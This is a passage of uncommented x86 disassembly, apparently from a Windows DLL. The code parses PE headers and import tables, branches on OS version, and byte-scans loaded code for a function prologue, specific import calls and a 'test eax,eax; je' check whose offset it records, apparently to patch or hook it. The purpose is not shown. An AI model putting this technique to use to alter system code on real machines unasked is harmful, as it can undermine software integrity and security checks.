10009b6d:	51                   	push   %ecx
10009b6e:	56                   	push   %esi
10009b6f:	8b 75 08             	mov    0x8(%ebp),%esi
10009b72:	85 f6                	test   %esi,%esi
10009b74:	57                   	push   %edi
10009b75:	74 56                	je     0x10009bcd
10009b77:	8b 7d 0c             	mov    0xc(%ebp),%edi
10009b7a:	85 ff                	test   %edi,%edi
10009b7c:	74 4f                	je     0x10009bcd
10009b7e:	83 7e 18 00          	cmpl   $0x0,0x18(%esi)
10009b82:	57                   	push   %edi
10009b83:	74 31                	je     0x10009bb6
10009b85:	e8 d6 37 00 00       	call   0x1000d360
10009b8a:	66 89 45 f8          	mov    %ax,-0x8(%ebp)
10009b8e:	8b 45 f8             	mov    -0x8(%ebp),%eax
10009b91:	40                   	inc    %eax
10009b92:	59                   	pop    %ecx
10009b93:	66 89 45 fa          	mov    %ax,-0x6(%ebp)
10009b97:	8d 45 08             	lea    0x8(%ebp),%eax
10009b9a:	83 65 08 00          	andl   $0x0,0x8(%ebp)
10009b9e:	50                   	push   %eax
10009b9f:	8d 45 f8             	lea    -0x8(%ebp),%eax
10009ba2:	6a 00                	push   $0x0
10009ba4:	50                   	push   %eax
10009ba5:	89 7d fc             	mov    %edi,-0x4(%ebp)
10009ba8:	ff 36                	push   (%esi)
10009baa:	ff 56 18             	call   *0x18(%esi)
10009bad:	85 c0                	test   %eax,%eax
10009baf:	75 1c                	jne    0x10009bcd
10009bb1:	8b 4d 08             	mov    0x8(%ebp),%ecx
10009bb4:	eb 0a                	jmp    0x10009bc0
10009bb6:	ff 36                	push   (%esi)
10009bb8:	ff 15 1c e1 00 10    	call   *0x1000e11c
10009bbe:	8b c8                	mov    %eax,%ecx
10009bc0:	85 c9                	test   %ecx,%ecx
10009bc2:	74 09                	je     0x10009bcd
10009bc4:	8b 46 04             	mov    0x4(%esi),%eax
10009bc7:	2b 06                	sub    (%esi),%eax
10009bc9:	03 c1                	add    %ecx,%eax
10009bcb:	eb 02                	jmp    0x10009bcf
10009bcd:	33 c0                	xor    %eax,%eax
10009bcf:	5f                   	pop    %edi
10009bd0:	5e                   	pop    %esi
10009bd1:	c9                   	leave
10009bd2:	c3                   	ret
10009bd3:	55                   	push   %ebp
10009bd4:	8b ec                	mov    %esp,%ebp
10009bd6:	81 ec 9c 00 00 00    	sub    $0x9c,%esp
10009bdc:	53                   	push   %ebx
10009bdd:	56                   	push   %esi
10009bde:	8b 75 08             	mov    0x8(%ebp),%esi
10009be1:	33 db                	xor    %ebx,%ebx
10009be3:	3b f3                	cmp    %ebx,%esi
10009be5:	57                   	push   %edi
10009be6:	74 45                	je     0x10009c2d
10009be8:	6a 24                	push   $0x24
10009bea:	53                   	push   %ebx
10009beb:	56                   	push   %esi
10009bec:	e8 25 37 00 00       	call   0x1000d316
10009bf1:	b8 8c 03 01 10       	mov    $0x1001038c,%eax
10009bf6:	50                   	push   %eax
10009bf7:	8b f8                	mov    %eax,%edi
10009bf9:	e8 34 2d 00 00       	call   0x1000c932
10009bfe:	83 c4 10             	add    $0x10,%esp
10009c01:	3b c3                	cmp    %ebx,%eax
10009c03:	89 46 04             	mov    %eax,0x4(%esi)
10009c06:	75 15                	jne    0x10009c1d
10009c08:	b8 7c 03 01 10       	mov    $0x1001037c,%eax
10009c0d:	50                   	push   %eax
10009c0e:	8b f8                	mov    %eax,%edi
10009c10:	e8 1d 2d 00 00       	call   0x1000c932
10009c15:	3b c3                	cmp    %ebx,%eax
10009c17:	59                   	pop    %ecx
10009c18:	89 46 04             	mov    %eax,0x4(%esi)
10009c1b:	74 10                	je     0x10009c2d
10009c1d:	6a 01                	push   $0x1
10009c1f:	53                   	push   %ebx
10009c20:	57                   	push   %edi
10009c21:	ff 15 f8 e0 00 10    	call   *0x1000e0f8
10009c27:	3b c3                	cmp    %ebx,%eax
10009c29:	89 06                	mov    %eax,(%esi)
10009c2b:	75 07                	jne    0x10009c34
10009c2d:	32 c0                	xor    %al,%al
10009c2f:	e9 ef 00 00 00       	jmp    0x10009d23
10009c34:	8d 85 64 ff ff ff    	lea    -0x9c(%ebp),%eax
10009c3a:	c7 85 64 ff ff ff 9c 	movl   $0x9c,-0x9c(%ebp)
10009c41:	00 00 00 
10009c44:	50                   	push   %eax
10009c45:	ff 15 b8 e0 00 10    	call   *0x1000e0b8
10009c4b:	85 c0                	test   %eax,%eax
10009c4d:	75 18                	jne    0x10009c67
10009c4f:	ff 15 dc e0 00 10    	call   *0x1000e0dc
10009c55:	0f b6 c8             	movzbl %al,%ecx
10009c58:	89 4e 08             	mov    %ecx,0x8(%esi)
10009c5b:	33 c9                	xor    %ecx,%ecx
10009c5d:	8a cc                	mov    %ah,%cl
10009c5f:	0f b6 c1             	movzbl %cl,%eax
10009c62:	89 46 0c             	mov    %eax,0xc(%esi)
10009c65:	eb 43                	jmp    0x10009caa
10009c67:	8b 8d 68 ff ff ff    	mov    -0x98(%ebp),%ecx
10009c6d:	8b 85 6c ff ff ff    	mov    -0x94(%ebp),%eax
10009c73:	66 8b 55 f8          	mov    -0x8(%ebp),%dx
10009c77:	66 8b 7d fa          	mov    -0x6(%ebp),%di
10009c7b:	83 f9 05             	cmp    $0x5,%ecx
10009c7e:	89 4e 08             	mov    %ecx,0x8(%esi)
10009c81:	89 46 0c             	mov    %eax,0xc(%esi)
10009c84:	66 89 56 10          	mov    %dx,0x10(%esi)
10009c88:	66 89 7e 12          	mov    %di,0x12(%esi)
10009c8c:	75 10                	jne    0x10009c9e
10009c8e:	83 f8 01             	cmp    $0x1,%eax
10009c91:	75 06                	jne    0x10009c99
10009c93:	66 83 fa 02          	cmp    $0x2,%dx
10009c97:	73 0a                	jae    0x10009ca3
10009c99:	83 f8 02             	cmp    $0x2,%eax
10009c9c:	74 05                	je     0x10009ca3
10009c9e:	83 f9 06             	cmp    $0x6,%ecx
10009ca1:	72 07                	jb     0x10009caa
10009ca3:	56                   	push   %esi
10009ca4:	e8 7f 00 00 00       	call   0x10009d28
10009ca9:	59                   	pop    %ecx
10009caa:	8b 46 08             	mov    0x8(%esi),%eax
10009cad:	83 e8 04             	sub    $0x4,%eax
10009cb0:	74 49                	je     0x10009cfb
10009cb2:	48                   	dec    %eax
10009cb3:	74 05                	je     0x10009cba
10009cb5:	48                   	dec    %eax
10009cb6:	75 49                	jne    0x10009d01
10009cb8:	eb 0e                	jmp    0x10009cc8
10009cba:	8b 46 0c             	mov    0xc(%esi),%eax
10009cbd:	3b c3                	cmp    %ebx,%eax
10009cbf:	74 28                	je     0x10009ce9
10009cc1:	76 3e                	jbe    0x10009d01
10009cc3:	83 f8 02             	cmp    $0x2,%eax
10009cc6:	77 39                	ja     0x10009d01
10009cc8:	68 70 03 01 10       	push   $0x10010370
10009ccd:	56                   	push   %esi
10009cce:	e8 96 fe ff ff       	call   0x10009b69
10009cd3:	68 64 03 01 10       	push   $0x10010364
10009cd8:	56                   	push   %esi
10009cd9:	89 46 1c             	mov    %eax,0x1c(%esi)
10009cdc:	e8 88 fe ff ff       	call   0x10009b69
10009ce1:	83 c4 10             	add    $0x10,%esp
10009ce4:	89 46 20             	mov    %eax,0x20(%esi)
10009ce7:	eb 18                	jmp    0x10009d01
10009ce9:	68 70 03 01 10       	push   $0x10010370
10009cee:	56                   	push   %esi
10009cef:	e8 75 fe ff ff       	call   0x10009b69
10009cf4:	59                   	pop    %ecx
10009cf5:	89 46 1c             	mov    %eax,0x1c(%esi)
10009cf8:	59                   	pop    %ecx
10009cf9:	eb 03                	jmp    0x10009cfe
10009cfb:	89 5e 1c             	mov    %ebx,0x1c(%esi)
10009cfe:	89 5e 20             	mov    %ebx,0x20(%esi)
10009d01:	83 7e 08 05          	cmpl   $0x5,0x8(%esi)
10009d05:	72 1a                	jb     0x10009d21
10009d07:	68 4c 03 01 10       	push   $0x1001034c
10009d0c:	68 40 03 01 10       	push   $0x10010340
10009d11:	ff 15 f4 e0 00 10    	call   *0x1000e0f4
10009d17:	50                   	push   %eax
10009d18:	ff 15 1c e1 00 10    	call   *0x1000e11c
10009d1e:	89 46 18             	mov    %eax,0x18(%esi)
10009d21:	b0 01                	mov    $0x1,%al
10009d23:	5f                   	pop    %edi
10009d24:	5e                   	pop    %esi
10009d25:	5b                   	pop    %ebx
10009d26:	c9                   	leave
10009d27:	c3                   	ret
10009d28:	55                   	push   %ebp
10009d29:	8b ec                	mov    %esp,%ebp
10009d2b:	6a ff                	push   $0xffffffff
10009d2d:	68 98 e5 00 10       	push   $0x1000e598
10009d32:	68 00 c6 00 10       	push   $0x1000c600
10009d37:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
10009d3d:	50                   	push   %eax
10009d3e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
10009d45:	83 ec 70             	sub    $0x70,%esp
10009d48:	53                   	push   %ebx
10009d49:	56                   	push   %esi
10009d4a:	57                   	push   %edi
10009d4b:	89 65 e8             	mov    %esp,-0x18(%ebp)
10009d4e:	33 c0                	xor    %eax,%eax
10009d50:	89 45 a8             	mov    %eax,-0x58(%ebp)
10009d53:	89 45 cc             	mov    %eax,-0x34(%ebp)
10009d56:	89 45 d4             	mov    %eax,-0x2c(%ebp)
10009d59:	89 45 b0             	mov    %eax,-0x50(%ebp)
10009d5c:	8b 75 08             	mov    0x8(%ebp),%esi
10009d5f:	8b 06                	mov    (%esi),%eax
10009d61:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%eax)
10009d66:	0f 85 e5 01 00 00    	jne    0x10009f51
10009d6c:	8b 78 3c             	mov    0x3c(%eax),%edi
10009d6f:	03 f8                	add    %eax,%edi
10009d71:	68 f8 00 00 00       	push   $0xf8
10009d76:	57                   	push   %edi
10009d77:	ff 15 fc e0 00 10    	call   *0x1000e0fc
10009d7d:	85 c0                	test   %eax,%eax
10009d7f:	0f 85 cc 01 00 00    	jne    0x10009f51
10009d85:	81 3f 50 45 00 00    	cmpl   $0x4550,(%edi)
10009d8b:	0f 85 c0 01 00 00    	jne    0x10009f51
10009d91:	8b 47 2c             	mov    0x2c(%edi),%eax
10009d94:	8b 5f 34             	mov    0x34(%edi),%ebx
10009d97:	03 d8                	add    %eax,%ebx
10009d99:	89 5d 98             	mov    %ebx,-0x68(%ebp)
10009d9c:	03 06                	add    (%esi),%eax
10009d9e:	89 45 a0             	mov    %eax,-0x60(%ebp)
10009da1:	8b 47 1c             	mov    0x1c(%edi),%eax
10009da4:	89 45 ac             	mov    %eax,-0x54(%ebp)
10009da7:	c7 45 dc fc 03 01 10 	movl   $0x100103fc,-0x24(%ebp)
10009dae:	8b 46 08             	mov    0x8(%esi),%eax
10009db1:	83 f8 05             	cmp    $0x5,%eax
10009db4:	75 0d                	jne    0x10009dc3
10009db6:	83 7e 0c 02          	cmpl   $0x2,0xc(%esi)
10009dba:	75 07                	jne    0x10009dc3
10009dbc:	66 83 7e 10 01       	cmpw   $0x1,0x10(%esi)
10009dc1:	73 05                	jae    0x10009dc8
10009dc3:	83 f8 06             	cmp    $0x6,%eax
10009dc6:	72 07                	jb     0x10009dcf
10009dc8:	c7 45 dc e4 03 01 10 	movl   $0x100103e4,-0x24(%ebp)
10009dcf:	68 40 03 01 10       	push   $0x10010340
10009dd4:	ff 15 14 e1 00 10    	call   *0x1000e114
10009dda:	89 45 c4             	mov    %eax,-0x3c(%ebp)
10009ddd:	85 c0                	test   %eax,%eax
10009ddf:	0f 84 6c 01 00 00    	je     0x10009f51
10009de5:	68 c4 03 01 10       	push   $0x100103c4
10009dea:	50                   	push   %eax
10009deb:	ff 15 1c e1 00 10    	call   *0x1000e11c
10009df1:	85 c0                	test   %eax,%eax
10009df3:	0f 84 58 01 00 00    	je     0x10009f51
10009df9:	8d 4d bc             	lea    -0x44(%ebp),%ecx
10009dfc:	51                   	push   %ecx
10009dfd:	6a 01                	push   $0x1
10009dff:	6a 01                	push   $0x1
10009e01:	ff 36                	push   (%esi)
10009e03:	ff d0                	call   *%eax
10009e05:	8b f8                	mov    %eax,%edi
10009e07:	ff 75 c4             	push   -0x3c(%ebp)
10009e0a:	ff 15 98 e0 00 10    	call   *0x1000e098
10009e10:	85 ff                	test   %edi,%edi
10009e12:	0f 84 03 01 00 00    	je     0x10009f1b
10009e18:	8b 47 0c             	mov    0xc(%edi),%eax
10009e1b:	85 c0                	test   %eax,%eax
10009e1d:	0f 84 f8 00 00 00    	je     0x10009f1b
10009e23:	83 7f 10 00          	cmpl   $0x0,0x10(%edi)
10009e27:	0f 84 ee 00 00 00    	je     0x10009f1b
10009e2d:	03 06                	add    (%esi),%eax
10009e2f:	50                   	push   %eax
10009e30:	68 bc 03 01 10       	push   $0x100103bc
10009e35:	e8 a2 36 00 00       	call   0x1000d4dc
10009e3a:	59                   	pop    %ecx
10009e3b:	59                   	pop    %ecx
10009e3c:	85 c0                	test   %eax,%eax
10009e3e:	0f 85 cf 00 00 00    	jne    0x10009f13
10009e44:	8b 7f 10             	mov    0x10(%edi),%edi
10009e47:	85 ff                	test   %edi,%edi
10009e49:	0f 84 80 00 00 00    	je     0x10009ecf
10009e4f:	03 3e                	add    (%esi),%edi
10009e51:	89 7d 94             	mov    %edi,-0x6c(%ebp)
10009e54:	89 7d 90             	mov    %edi,-0x70(%ebp)
10009e57:	8b 45 90             	mov    -0x70(%ebp),%eax
10009e5a:	8b 00                	mov    (%eax),%eax
10009e5c:	85 c0                	test   %eax,%eax
10009e5e:	74 6f                	je     0x10009ecf
10009e60:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10009e64:	8b c8                	mov    %eax,%ecx
10009e66:	c1 e9 1f             	shr    $0x1f,%ecx
10009e69:	88 4d 84             	mov    %cl,-0x7c(%ebp)
10009e6c:	84 c9                	test   %cl,%cl
10009e6e:	75 4f                	jne    0x10009ebf
10009e70:	03 06                	add    (%esi),%eax
10009e72:	89 45 88             	mov    %eax,-0x78(%ebp)
10009e75:	83 c0 02             	add    $0x2,%eax
10009e78:	89 45 8c             	mov    %eax,-0x74(%ebp)
10009e7b:	68 a8 03 01 10       	push   $0x100103a8
10009e80:	50                   	push   %eax
10009e81:	e8 56 36 00 00       	call   0x1000d4dc
10009e86:	59                   	pop    %ecx
10009e87:	59                   	pop    %ecx
10009e88:	85 c0                	test   %eax,%eax
10009e8a:	75 11                	jne    0x10009e9d
10009e8c:	8b 45 90             	mov    -0x70(%ebp),%eax
10009e8f:	89 45 d4             	mov    %eax,-0x2c(%ebp)
10009e92:	2b 45 a0             	sub    -0x60(%ebp),%eax
10009e95:	89 45 e0             	mov    %eax,-0x20(%ebp)
10009e98:	03 c3                	add    %ebx,%eax
10009e9a:	89 45 a8             	mov    %eax,-0x58(%ebp)
10009e9d:	ff 75 dc             	push   -0x24(%ebp)
10009ea0:	ff 75 8c             	push   -0x74(%ebp)
10009ea3:	e8 34 36 00 00       	call   0x1000d4dc
10009ea8:	59                   	pop    %ecx
10009ea9:	59                   	pop    %ecx
10009eaa:	85 c0                	test   %eax,%eax
10009eac:	75 11                	jne    0x10009ebf
10009eae:	8b 45 90             	mov    -0x70(%ebp),%eax
10009eb1:	89 45 b0             	mov    %eax,-0x50(%ebp)
10009eb4:	2b 45 a0             	sub    -0x60(%ebp),%eax
10009eb7:	89 45 9c             	mov    %eax,-0x64(%ebp)
10009eba:	03 c3                	add    %ebx,%eax
10009ebc:	89 45 cc             	mov    %eax,-0x34(%ebp)
10009ebf:	83 7d d4 00          	cmpl   $0x0,-0x2c(%ebp)
10009ec3:	74 18                	je     0x10009edd
10009ec5:	83 7d b0 00          	cmpl   $0x0,-0x50(%ebp)
10009ec9:	74 12                	je     0x10009edd
10009ecb:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10009ecf:	83 7d d4 00          	cmpl   $0x0,-0x2c(%ebp)
10009ed3:	74 7c                	je     0x10009f51
10009ed5:	83 7d b0 00          	cmpl   $0x0,-0x50(%ebp)
10009ed9:	75 40                	jne    0x10009f1b
10009edb:	eb 74                	jmp    0x10009f51
10009edd:	83 45 90 04          	addl   $0x4,-0x70(%ebp)
10009ee1:	83 c7 04             	add    $0x4,%edi
10009ee4:	89 7d 94             	mov    %edi,-0x6c(%ebp)
10009ee7:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10009eeb:	e9 67 ff ff ff       	jmp    0x10009e57
10009ef0:	8b 45 ec             	mov    -0x14(%ebp),%eax
10009ef3:	8b 00                	mov    (%eax),%eax
10009ef5:	8b 00                	mov    (%eax),%eax
10009ef7:	89 45 80             	mov    %eax,-0x80(%ebp)
10009efa:	6a 01                	push   $0x1
10009efc:	58                   	pop    %eax
10009efd:	c3                   	ret
10009efe:	8b 65 e8             	mov    -0x18(%ebp),%esp
10009f01:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10009f05:	8b 75 08             	mov    0x8(%ebp),%esi
10009f08:	8b 5d 98             	mov    -0x68(%ebp),%ebx
10009f0b:	8b 7d 94             	mov    -0x6c(%ebp),%edi
10009f0e:	e9 44 ff ff ff       	jmp    0x10009e57
10009f13:	83 c7 14             	add    $0x14,%edi
10009f16:	e9 fd fe ff ff       	jmp    0x10009e18
10009f1b:	68 9c 03 01 10       	push   $0x1001039c
10009f20:	ff 36                	push   (%esi)
10009f22:	ff 15 1c e1 00 10    	call   *0x1000e11c
10009f28:	85 c0                	test   %eax,%eax
10009f2a:	74 25                	je     0x10009f51
10009f2c:	83 7e 08 06          	cmpl   $0x6,0x8(%esi)
10009f30:	50                   	push   %eax
10009f31:	ff 75 cc             	push   -0x34(%ebp)
10009f34:	ff 75 a8             	push   -0x58(%ebp)
10009f37:	ff 75 ac             	push   -0x54(%ebp)
10009f3a:	ff 75 a0             	push   -0x60(%ebp)
10009f3d:	56                   	push   %esi
10009f3e:	73 0a                	jae    0x10009f4a
10009f40:	e8 1d 00 00 00       	call   0x10009f62
10009f45:	83 c4 18             	add    $0x18,%esp
10009f48:	eb 09                	jmp    0x10009f53
10009f4a:	e8 0c 01 00 00       	call   0x1000a05b
10009f4f:	eb f4                	jmp    0x10009f45
10009f51:	32 c0                	xor    %al,%al
10009f53:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10009f56:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10009f5d:	5f                   	pop    %edi
10009f5e:	5e                   	pop    %esi
10009f5f:	5b                   	pop    %ebx
10009f60:	c9                   	leave
10009f61:	c3                   	ret
10009f62:	55                   	push   %ebp
10009f63:	8b ec                	mov    %esp,%ebp
10009f65:	8b 45 1c             	mov    0x1c(%ebp),%eax
10009f68:	83 65 1c 00          	andl   $0x0,0x1c(%ebp)
10009f6c:	53                   	push   %ebx
10009f6d:	56                   	push   %esi
10009f6e:	57                   	push   %edi
10009f6f:	8d b8 00 f0 ff ff    	lea    -0x1000(%eax),%edi
10009f75:	80 3f 55             	cmpb   $0x55,(%edi)
10009f78:	0f 85 b2 00 00 00    	jne    0x1000a030
10009f7e:	80 7f 01 8b          	cmpb   $0x8b,0x1(%edi)
10009f82:	0f 85 a8 00 00 00    	jne    0x1000a030
10009f88:	80 7f 02 ec          	cmpb   $0xec,0x2(%edi)
10009f8c:	0f 85 9e 00 00 00    	jne    0x1000a030
10009f92:	8b cf                	mov    %edi,%ecx
10009f94:	33 f6                	xor    %esi,%esi
10009f96:	80 39 e8             	cmpb   $0xe8,(%ecx)
10009f99:	0f 85 86 00 00 00    	jne    0x1000a025
10009f9f:	0f b6 41 04          	movzbl 0x4(%ecx),%eax
10009fa3:	0f b6 51 03          	movzbl 0x3(%ecx),%edx
10009fa7:	c1 e0 08             	shl    $0x8,%eax
10009faa:	03 c2                	add    %edx,%eax
10009fac:	8b d9                	mov    %ecx,%ebx
10009fae:	0f b6 51 02          	movzbl 0x2(%ecx),%edx
10009fb2:	c1 e0 08             	shl    $0x8,%eax
10009fb5:	03 c2                	add    %edx,%eax
10009fb7:	0f b6 51 01          	movzbl 0x1(%ecx),%edx
10009fbb:	c1 e0 08             	shl    $0x8,%eax
10009fbe:	03 d8                	add    %eax,%ebx
10009fc0:	8d 44 1a 05          	lea    0x5(%edx,%ebx,1),%eax
10009fc4:	8b 55 0c             	mov    0xc(%ebp),%edx
10009fc7:	3b c2                	cmp    %edx,%eax
10009fc9:	72 5b                	jb     0x1000a026
10009fcb:	8b 5d 10             	mov    0x10(%ebp),%ebx
10009fce:	03 d3                	add    %ebx,%edx
10009fd0:	3b c2                	cmp    %edx,%eax
10009fd2:	77 52                	ja     0x1000a026
10009fd4:	33 f6                	xor    %esi,%esi
10009fd6:	80 38 ff             	cmpb   $0xff,(%eax)
10009fd9:	75 0e                	jne    0x10009fe9
10009fdb:	80 78 01 15          	cmpb   $0x15,0x1(%eax)
10009fdf:	75 08                	jne    0x10009fe9
10009fe1:	8b 50 02             	mov    0x2(%eax),%edx
10009fe4:	3b 55 14             	cmp    0x14(%ebp),%edx
10009fe7:	74 09                	je     0x10009ff2
10009fe9:	40                   	inc    %eax
10009fea:	46                   	inc    %esi
10009feb:	83 fe 32             	cmp    $0x32,%esi
10009fee:	7c e6                	jl     0x10009fd6
10009ff0:	eb 33                	jmp    0x1000a025
10009ff2:	83 c0 06             	add    $0x6,%eax
10009ff5:	33 d2                	xor    %edx,%edx
10009ff7:	80 38 ff             	cmpb   $0xff,(%eax)
10009ffa:	75 22                	jne    0x1000a01e
10009ffc:	80 78 01 15          	cmpb   $0x15,0x1(%eax)
1000a000:	75 1c                	jne    0x1000a01e
1000a002:	8b 58 02             	mov    0x2(%eax),%ebx
1000a005:	3b 5d 18             	cmp    0x18(%ebp),%ebx
1000a008:	75 14                	jne    0x1000a01e
1000a00a:	83 c1 05             	add    $0x5,%ecx
1000a00d:	80 39 85             	cmpb   $0x85,(%ecx)
1000a010:	75 0c                	jne    0x1000a01e
1000a012:	80 79 01 c0          	cmpb   $0xc0,0x1(%ecx)
1000a016:	75 06                	jne    0x1000a01e
1000a018:	80 79 02 74          	cmpb   $0x74,0x2(%ecx)
1000a01c:	74 2a                	je     0x1000a048
1000a01e:	40                   	inc    %eax
1000a01f:	42                   	inc    %edx
1000a020:	83 fa 14             	cmp    $0x14,%edx
1000a023:	7c d2                	jl     0x10009ff7
1000a025:	41                   	inc    %ecx
1000a026:	46                   	inc    %esi
1000a027:	83 fe 32             	cmp    $0x32,%esi
1000a02a:	0f 8c 66 ff ff ff    	jl     0x10009f96
1000a030:	47                   	inc    %edi
1000a031:	ff 45 1c             	incl   0x1c(%ebp)
1000a034:	81 7d 1c 00 20 00 00 	cmpl   $0x2000,0x1c(%ebp)
1000a03b:	0f 8c 34 ff ff ff    	jl     0x10009f75
1000a041:	32 c0                	xor    %al,%al
1000a043:	5f                   	pop    %edi
1000a044:	5e                   	pop    %esi
1000a045:	5b                   	pop    %ebx
1000a046:	5d                   	pop    %ebp
1000a047:	c3                   	ret
1000a048:	8b 45 08             	mov    0x8(%ebp),%eax
1000a04b:	8b 50 04             	mov    0x4(%eax),%edx
1000a04e:	2b 10                	sub    (%eax),%edx
1000a050:	8d 4c 0a 02          	lea    0x2(%edx,%ecx,1),%ecx
1000a054:	89 48 14             	mov    %ecx,0x14(%eax)
1000a057:	b0 01                	mov    $0x1,%al
1000a059:	eb e8                	jmp    0x1000a043
1000a05b:	8b 44 24 18          	mov    0x18(%esp),%eax
1000a05f:	56                   	push   %esi
1000a060:	57                   	push   %edi
1000a061:	33 ff                	xor    %edi,%edi
1000a063:	8d 90 00 f0 ff ff    	lea    -0x1000(%eax),%edx
1000a069:	80 3a 55             	cmpb   $0x55,(%edx)
1000a06c:	75 6b                	jne    0x1000a0d9
1000a06e:	80 7a 01 8b          	cmpb   $0x8b,0x1(%edx)
1000a072:	75 65                	jne    0x1000a0d9
1000a074:	80 7a 02 ec          	cmpb   $0xec,0x2(%edx)
1000a078:	75 5f                	jne    0x1000a0d9
1000a07a:	8d 42 03             	lea    0x3(%edx),%eax
1000a07d:	33 ff                	xor    %edi,%edi
1000a07f:	80 38 ff             	cmpb   $0xff,(%eax)
1000a082:	75 0f                	jne    0x1000a093
1000a084:	80 78 01 15          	cmpb   $0x15,0x1(%eax)
1000a088:	75 09                	jne    0x1000a093
1000a08a:	8b 48 02             	mov    0x2(%eax),%ecx
1000a08d:	3b 4c 24 18          	cmp    0x18(%esp),%ecx
1000a091:	74 09                	je     0x1000a09c
1000a093:	40                   	inc    %eax
1000a094:	47                   	inc    %edi
1000a095:	83 ff 32             	cmp    $0x32,%edi
1000a098:	7c e5                	jl     0x1000a07f
1000a09a:	eb 3d                	jmp    0x1000a0d9
1000a09c:	83 c0 06             	add    $0x6,%eax
1000a09f:	33 f6                	xor    %esi,%esi
1000a0a1:	80 38 ff             	cmpb   $0xff,(%eax)
1000a0a4:	75 2c                	jne    0x1000a0d2
1000a0a6:	80 78 01 15          	cmpb   $0x15,0x1(%eax)
1000a0aa:	75 26                	jne    0x1000a0d2
1000a0ac:	8b 48 02             	mov    0x2(%eax),%ecx
1000a0af:	3b 4c 24 1c          	cmp    0x1c(%esp),%ecx
1000a0b3:	75 1d                	jne    0x1000a0d2
1000a0b5:	83 c0 06             	add    $0x6,%eax
1000a0b8:	33 c9                	xor    %ecx,%ecx
1000a0ba:	80 38 85             	cmpb   $0x85,(%eax)
1000a0bd:	75 0c                	jne    0x1000a0cb
1000a0bf:	80 78 01 c0          	cmpb   $0xc0,0x1(%eax)
1000a0c3:	75 06                	jne    0x1000a0cb
1000a0c5:	80 78 02 74          	cmpb   $0x74,0x2(%eax)
1000a0c9:	74 1d                	je     0x1000a0e8
1000a0cb:	40                   	inc    %eax
1000a0cc:	41                   	inc    %ecx
1000a0cd:	83 f9 28             	cmp    $0x28,%ecx
1000a0d0:	7c e8                	jl     0x1000a0ba
1000a0d2:	40                   	inc    %eax
1000a0d3:	46                   	inc    %esi
1000a0d4:	83 fe 14             	cmp    $0x14,%esi
1000a0d7:	7c c8                	jl     0x1000a0a1
1000a0d9:	42                   	inc    %edx
1000a0da:	47                   	inc    %edi
1000a0db:	81 ff 00 20 00 00    	cmp    $0x2000,%edi
1000a0e1:	7c 86                	jl     0x1000a069
1000a0e3:	32 c0                	xor    %al,%al
1000a0e5:	5f                   	pop    %edi
1000a0e6:	5e                   	pop    %esi
1000a0e7:	c3                   	ret
1000a0e8:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
1000a0ec:	8b 51 04             	mov    0x4(%ecx),%edx
1000a0ef:	2b 11                	sub    (%ecx),%edx
1000a0f1:	8d 44 02 02          	lea    0x2(%edx,%eax,1),%eax
1000a0f5:	89 41 14             	mov    %eax,0x14(%ecx)
1000a0f8:	b0 01                	mov    $0x1,%al
1000a0fa:	eb e9                	jmp    0x1000a0e5
1000a0fc:	55                   	push   %ebp
1000a0fd:	8b ec                	mov    %esp,%ebp
1000a0ff:	81 ec 50 02 00 00    	sub    $0x250,%esp
1000a105:	53                   	push   %ebx
1000a106:	56                   	push   %esi
1000a107:	57                   	push   %edi
1000a108:	33 ff                	xor    %edi,%edi
1000a10a:	39 7d 08             	cmp    %edi,0x8(%ebp)
1000a10d:	0f 84 3f 01 00 00    	je     0x1000a252
1000a113:	39 7d 0c             	cmp    %edi,0xc(%ebp)
1000a116:	0f 84 36 01 00 00    	je     0x1000a252
1000a11c:	8b 5d 10             	mov    0x10(%ebp),%ebx
1000a11f:	3b df                	cmp    %edi,%ebx
1000a121:	0f 84 2b 01 00 00    	je     0x1000a252
1000a127:	be 04 01 00 00       	mov    $0x104,%esi
1000a12c:	8d 85 b0 fd ff ff    	lea    -0x250(%ebp),%eax
1000a132:	56                   	push   %esi
1000a133:	50                   	push   %eax
1000a134:	68 64 04 01 10       	push   $0x10010464
1000a139:	ff 15 04 e1 00 10    	call   *0x1000e104
1000a13f:	8d 85 b0 fd ff ff    	lea    -0x250(%ebp),%eax
1000a145:	50                   	push   %eax
1000a146:	ff 15 e8 e1 00 10    	call   *0x1000e1e8
1000a14c:	2b f0                	sub    %eax,%esi
1000a14e:	8d 85 b0 fd ff ff    	lea    -0x250(%ebp),%eax
1000a154:	56                   	push   %esi
1000a155:	68 38 04 01 10       	push   $0x10010438
1000a15a:	50                   	push   %eax
1000a15b:	ff 15 88 e1 00 10    	call   *0x1000e188
1000a161:	83 c4 10             	add    $0x10,%esp
1000a164:	8d 85 b0 fd ff ff    	lea    -0x250(%ebp),%eax
1000a16a:	57                   	push   %edi
1000a16b:	68 00 00 00 08       	push   $0x8000000
1000a170:	6a 03                	push   $0x3
1000a172:	57                   	push   %edi
1000a173:	6a 01                	push   $0x1
1000a175:	68 00 00 00 80       	push   $0x80000000
1000a17a:	50                   	push   %eax
1000a17b:	ff 15 00 e1 00 10    	call   *0x1000e100
1000a181:	8b f0                	mov    %eax,%esi
1000a183:	83 fe ff             	cmp    $0xffffffff,%esi
1000a186:	75 07                	jne    0x1000a18f
1000a188:	6a d7                	push   $0xffffffd7
1000a18a:	e9 c5 00 00 00       	jmp    0x1000a254
1000a18f:	8b 45 14             	mov    0x14(%ebp),%eax
1000a192:	89 5d d0             	mov    %ebx,-0x30(%ebp)
1000a195:	89 45 d4             	mov    %eax,-0x2c(%ebp)
1000a198:	8b 45 18             	mov    0x18(%ebp),%eax
1000a19b:	89 45 d8             	mov    %eax,-0x28(%ebp)
1000a19e:	8d 45 cc             	lea    -0x34(%ebp),%eax
1000a1a1:	50                   	push   %eax
1000a1a2:	8d 45 c8             	lea    -0x38(%ebp),%eax
1000a1a5:	50                   	push   %eax
1000a1a6:	8d 45 c4             	lea    -0x3c(%ebp),%eax
1000a1a9:	50                   	push   %eax
1000a1aa:	8d 45 c0             	lea    -0x40(%ebp),%eax
1000a1ad:	50                   	push   %eax
1000a1ae:	8d 45 bc             	lea    -0x44(%ebp),%eax
1000a1b1:	50                   	push   %eax
